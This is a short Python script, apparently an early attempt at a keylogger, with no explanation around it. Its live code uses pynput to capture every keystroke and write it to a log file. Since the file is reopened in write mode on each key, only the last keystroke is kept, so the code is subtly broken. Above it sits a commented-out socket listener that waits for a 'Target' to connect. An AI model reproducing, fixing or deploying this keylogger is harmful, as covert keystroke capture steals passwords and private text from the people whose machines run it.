#!/usr/bin/python
#import socket

#s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
#s.bind(("127.0.0.1", 54321))
#s.listen(5)
#print("listening for incoming connection")
#target, ip = s.accept()
#print("Target Connected")
#s.close()
# ==============
import pynput.keyboard


def process_keys(key):
    with open("log.txt", "w") as fin:
        fin.write(str(key))


keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
with keyboard_listener:
    keyboard_listener.join()

